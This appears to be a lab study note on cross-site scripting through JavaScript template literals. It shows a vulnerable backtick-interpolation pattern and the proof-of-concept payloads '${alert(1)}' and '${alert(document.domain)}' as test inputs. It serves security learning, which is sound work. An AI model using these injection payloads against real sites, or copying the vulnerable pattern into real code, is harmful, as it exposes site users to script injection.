# XSS in JavaScript Template Literals

## Overview

Template literals are JavaScript strings enclosed by:

```javascript
`
```

(backticks).

Example:

```javascript
var msg = `Welcome ${username}`;
```

---

# Interpolation

Template literals support:

```javascript
${expression}
```

which is evaluated automatically.

---

# Example

```javascript
var msg = `Result: ${7*7}`;
```

Output:

```text
49
```

---

# Vulnerable Scenario

```javascript
var input = `USER_INPUT`;
```

---

# Exploitation

Payload:

```javascript
${alert(1)}
```

---

Result:

```javascript
var input = `${alert(1)}`;
```

---

Execution Flow

```text
Template Literal
        ↓
Expression Evaluation
        ↓
alert(1)
```

---

# Why No Breakout Is Needed

Traditional strings require:

```javascript
';
```

or

```javascript
"
```

breakouts.

Template literals allow direct execution through:

```javascript
${ }
```

syntax.

---

# Real Example

```javascript
var greeting = `Hello ${user}`;
```

---

Payload:

```javascript
${alert(document.domain)}
```

---

# Related Lab

- Lab23

---

# Key Takeaways

- Template literals introduce unique attack surfaces.
- No string termination required.
- Always test:

```javascript
${7*7}
```

or

```javascript
${alert(1)}
```

when backticks are present.